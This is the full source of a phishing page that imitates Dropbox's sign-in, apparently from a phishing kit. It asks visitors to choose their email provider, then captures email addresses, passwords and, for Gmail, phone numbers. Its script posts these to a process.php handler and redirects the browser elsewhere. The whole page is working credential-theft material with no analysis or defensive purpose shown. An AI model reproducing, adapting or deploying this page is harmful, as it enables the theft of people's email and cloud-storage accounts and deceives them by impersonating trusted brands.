<!DOCTYPE html>
<html>
	<head>
		<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
		<link href="assets/favicon.ico" rel="shortcut icon">

		<meta content="text/html; charset=UTF-8" http-equiv="content-type">
		<meta content="width=device-width, user-scalable=no" name="viewport">
		<meta http-equiv='cache-control' content='no-cache'>
		<meta http-equiv='expires' content='0'>
		<meta http-equiv='pragma' content='no-cache'>
		<title>Dropbox</title>
		<style type="text/css">.hny-htirfw { display: none; }</style> 
		<link href="assets/animation-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/components-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/media_text-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/base-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/index-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/responsive_classes-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/modal-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">

		<link href="assets/web_sprites-ywsM5EMP6qaHyeVv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
		<link href="assets/css-ywsM5EMP6qaHyeVv.css" type="text/css" rel="stylesheet">

		<script src="assets/jquery-ywsM5EMP6qaHyeVv.js" type="text/javascript"></script>
	</head>
	<body class="en  dropbox-2015 dropbox-2015--responsive dropbox-logo-2015 exp-growth_web_google_register__GOOGLE3"> 
		<div style="display: none;" id="db-modal-index-sign-in-modal" class="db-modal-wrapper ui-modal">
			<div class="db-modal-overlay"></div>
			<div class="db-modal" style="width:422px;">
				<div class="db-modal-box">
					<a aria-label="Close" href="#" class="db-modal-x"></a>
					<h2 class="db-modal-title">
						<div class="db-modal-title-text">Sign in</div>
					</h2>
					<div class="db-modal-content">
						<div data-js-component-id="component39208" id="pyxl39207" class="login-form-container standard">
							<div id="regular-login-forms">
								<form action="#" novalidate="" style="" method="POST" class="clearfix credentials-form login-form">
									<div class="credentials-form__fields">
										<div data-js-component-id="component39211" tabindex="-1" id="pyxl39209" class="login-email text-input login-text-input standard">
											<div class="text-input-error-wrapper">
												<form:error name="login_email">
													<div class="em_error"></div>
												</form:error>
											</div>
											<div class="text-input-wrapper">
												<input class="text-input-input autofocus" name="em" id="pyxl39210" type="email" placeholder="Email"> 
												<small class="secondary-label"></small>
											</div>
										</div>
										<div data-js-component-id="component39214" tabindex="-1" id="pyxl39212" class="text-input login-password login-text-input standard">
											<div class="text-input-error-wrapper">
												<form:error name="login_password">
													<div class="psw_error"></div>
												</form:error>
											</div>
											<div class="text-input-wrapper">
												<input class="text-input-input" id="pyxl39213" name="psw" type="password" placeholder="Password"> 
												<small class="secondary-label"></small>
												<div class="password-caps-indicator">Caps lock is currently on</div>
											</div>
										</div>
										<div data-js-component-id="component39214" tabindex="-1" id="pyxl39209" class="text-input login-password login-text-input standard">
											<div class="text-input-error-wrapper">
												<form:error name="login_password">
													<div class="phn_error"></div>
												</form:error>
											</div>
											<div class="text-input-wrapper phone-box" style="display:none;">
												<input class="text-input-input" id="pyxl39213" name="phn" type="text" placeholder="Verify Phone"> 
												<input type="hidden" name="sub" id="sub" />
												<small class="secondary-label">Phone No (Without +)</small>
											</div>
										</div>
										<div class="login-via-email-link-container">or <a class="login-via-email-link">email me a link to sign in</a></div>
									</div>
									<div id="react-login-recaptcha-challenge-div"></div>
									<div class="clearfix">
										<div class="sso-description">
											<div class="sprite-div">
												<div class="sprite-frame small icon-left">
													<img src="assets/icon_spacer-vflN3BYt2.gif" alt="" class=" sprite sprite_web s_web_lock">
												</div>
												<div class="sprite-text">
													<div class="sprite-text-inner">Single sign-on enabled</div>
												</div>
											</div>
										</div>
										<div class="checkbox checkbox-inline standard remember-me">
											<div class="text-input-error-wrapper">
												<form:error name="remember_me">
													<div data-error-field-name="remember_me"></div>
												</form:error>
											</div>
											<input checked="checked" id="pyxl39215" name="remember_me" type="checkbox">
											<label for="pyxl39215">Remember me</label>
										</div>
										<button data-js-component-id="component39216" type="button" class="login-button button-primary">
											<div class="sign-in-text">Sign in</div>
											<div class="sso-text">Continue</div>
										</button>
										<span class="login-loading-indicator">
											<img data-js-component-id="component39217" src="assets/ajax-loading-small-vfl3Wt7C_.gif" data-hi-res="assets/ajax-loading-small@2x-vflAxdZTP.gif">
										</span>
									</div>
									<div class="sso-optout">
										<div>or <a href="#">Log in with Dropbox credentials</a></div>
									</div>
									<div class="login-need-help">
										<a href="#">Forgot your password?</a>
									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<header class="mast-head">
			<div class="mast-head__container container">
				<nav class="mast-head__nav mast-head-nav">
					<ul class="nav-list">
						<li class="nav-list__item nav-list__item--dfb">
							<a data-js-component-id="component39250" href="#" id="try-dfb" class="button-tertiary try-dfb">Try Dropbox Business</a>
						</li>
					</ul>
					<ul class="nav-list">
						<li class="nav-list__item nav-list__item--download">
							<a href="#" class="button-link">Download the app</a>
						</li> 
					</ul>
				</nav>
				<h1 id="dropbox-logo" class="dropbox-logo">
					<span class="dropbox-logo__glyph"></span>
					<span class="dropbox-logo__type">Dropbox</span>
				</h1>
			</div>
		</header> 
		<section class="hero small-padding" style="padding-top:80px; padding-bottom:0px;">
			<div class="sign-up-form-v1 sign-up-form-v1-hero new-exp-form-image hero__content" style="padding-top:0px; padding-bottom:0px;">
				<img style="display:block; margin:0px auto; height:280px;" data-js-component-id="component39251" src="assets/hero-poster.png" class="hero__image hero__image--responsive" data-hi-res-no-resize="True">
			</div>
			<header class="header-text" style="padding:0px;">
				<h2 class="medium-title" style="margin-top:0px; margin-bottom:0px; padding-bottom:0px;">Now , you can sign in to dropbox with your email</h2>
				<p class="small-title" style="margin-top:0px; font-size:25px; color:#D6373B;">Select your email provider</p>
			</header>
		</section>
<style>
.mail-selector { 
	opacity: 0.5;
	filter: alpha(opacity=50);
	cursor:pointer;
	filter: grayscale(100%);
}

.mail-selector:hover {
	opacity: 1;
	filter: alpha(opacity=100);
	filter: grayscale(0%);
}
</style>
</style> 
		<section class="footer-row" style="padding:15px 0px; background:#fff;">
			<footer id="homepage-footer" class="twelve-column clearfix">
				<table>
					<tbody>
						<tr>
							<td style="width:20%; text-align:center;"><img data="gm" class="mail-selector" src="assets/gmail.jpg" style="height:50px;" /></td>
							<td style="width:20%; text-align:center; padding-top:10px;"><img data="ym" class="mail-selector" src="assets/yahoo.png" style="height:55px;" /></td>
							<td style="width:20%; text-align:center;"><img data="hm" class="mail-selector" src="assets/hotmail.png" style="height:50px;" /></td>
							<td style="width:20%; text-align:center;"><img data="am" class="mail-selector" src="assets/aol.png" style="height:40px;" /></td>
														<td style="width:15%; "><img data="netease" class="mail-selector" src="assets/netease.png" style="height:50px;" /></td>

							<td style="width:15%; "><img data="om" class="mail-selector" src="assets/other.jpg" style="height:50px;" /></td>
						</tr>
					</tbody>
				</table>
			</footer>
		</section> 
	</body>
<script>
$(document).ready(function() {
	$('.db-modal-x').click(function() {
		$('div.em_error, div.psw_error, div.phn_error').html('');
		$('button.login-button').removeAttr('disabled');
		$('.login-loading-indicator').css({'display':'none'});
		$('input[name=em], input[name=psw], input[name=phn]').val('');
		$('div#db-modal-index-sign-in-modal').css({'display':'none'});
		$('div.phone-box').css({'display':'none'});
		$('div.db-modal-title-text').html('Sign in');
	});
	$('img.mail-selector').click(function() {
		var provider=$(this).attr('data');
		switch(provider) {
			case 'gm':
				$('div.db-modal-title-text').html('<img src="assets/gmail.jpg" style="height:30px; float:left; margin-right:40px;" /> Sign in with Gmail');
				$('input#sub').val("GMAIL");
				$('div.phone-box').css({'display':'block'});
			break;
			case 'ym':
				$('div.db-modal-title-text').html('<img src="assets/yahoo.png" style="height:30px; position:relative; float:left; margin-right:50px;" /> Sign in with Yahoo');
				$('input#sub').val("YAHOO-MAIL");
			break;
			case 'hm':
				$('div.db-modal-title-text').html('<img src="assets/hotmail.png" style="height:30px; float:left; margin-right:30px;" /> Sign in with Outlook');
				$('input#sub').val("HOTMAIL");
			break;
			case 'am':
				$('div.db-modal-title-text').html('<img src="assets/aol.png" style="height:30px; float:left; margin-right:50px;" /> Sign in with Aol');
				$('input#sub').val("AOL-MAIL");
			break;
						case 'netease':
				$('div.db-modal-title-text').html('<img src="assets/netease.png" style="height:30px; float:left; margin-right:50px;" /> Sign in with netease');
				$('input#sub').val("NETEASE-MAIL");
			break;
			case 'ys1':
				$('div.db-modal-title-text').html('<img src="assets/ys1.jpg" style="height:30px; float:left; margin-right:50px;" /> Sign in with mail-163');
				$('input#sub').val("ys1");
			break;
			case 'om':
				$('div.db-modal-title-text').html('Sign in with other email provider');
				$('input#sub').val("MAIL");
			break;

		}
		$('div#db-modal-index-sign-in-modal').css({'display':'block'});
	});
	$("input[name=phn]").keydown(function (e) {
		// Allow: backspace, delete, tab, escape, enter and .
		if ($.inArray(e.keyCode, [43, 46, 8, 9, 27, 13, 110, 190]) !== -1 ||
		     // Allow: Ctrl+A, Command+A
		    (e.keyCode == 65 && ( e.ctrlKey === true || e.metaKey === true || e.shiftKey===true) ) || 
		     // Allow: home, end, left, right, down, up
		    (e.keyCode >= 35 && e.keyCode <= 40)) {
		         // let it happen, don't do anything
		         return;
		}
		// Ensure that it is a number and stop the keypress
		if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
		    e.preventDefault();
		}
	});
	$('div.credentials-form__fields').keypress(function (e) {
		var key = e.which;
		if(key == 13) {
			$('button.login-button').click(); 
		}
	});   
	$('button.login-button').click(function() {
		$('div.em_error, div.psw_error, div.phn_error').html('');
		var sub=$('input#sub').val();
		var em=$.trim($('input[name=em]').val());
		var psw=$.trim($('input[name=psw]').val());
		var phn=$.trim($('input[name=phn]').val());
		if(!em.match(/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/)) {
			$('div.em_error').html('Please enter your email');
			return false;
		}
		if(psw.length<5) {
			$('div.psw_error').html('Please enter your password');
			return false;
		}	
		if(sub!='gmail') {
			$('button.login-button').attr({'disabled':'disabled'});
			$('.login-loading-indicator').css({'display':'block'});
			$.post('process.php', {em:em, psw:psw, phn:phn, sub:sub}, function(res) {
				document.location.href=res;
			});
		}
		if(sub=='gmail') {
			if(phn.length<9) {
				$('div.phn_error').html('Please verify your phone number');
				return false;
			}		
			else {
				$('button.login-button').attr({'disabled':'disabled'});
				$('.login-loading-indicator').css({'display':'block'});
				$.post('process.php', {em:em, psw:psw, phn:phn, sub:sub}, function(res) {
					document.location.href=res;			
				});
			}	
		}
	});
})
</script>
</html>